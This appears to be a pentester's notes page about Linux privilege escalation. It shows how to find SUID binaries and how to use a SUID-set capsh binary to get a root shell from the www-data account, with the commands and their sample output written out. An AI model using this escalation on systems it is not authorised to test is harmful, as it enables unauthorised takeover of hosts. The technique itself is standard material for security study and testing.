# capsh

Searching for files with the SUID bit set

```bash
find / -perm /4000 2>/dev/null
```

```bash
www-data@50bca5e748b0:/var/www/html$ find / -perm /4000 2>/dev/null

/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/sbin/capsh
/bin/mount
/bin/umount
/bin/su
```

Command

```bash
 capsh --gid=0 --uid=0 --
```

Example

```bash
www-data@50bca5e748b0:/var/www/html$ capsh --gid=0 --uid=0 --

id
uid=0(root) gid=0(root) groups=0(root), 33 (www-data)
```

{% embed url="https://gtfobins.github.io/gtfobins/capsh/#suid" %}

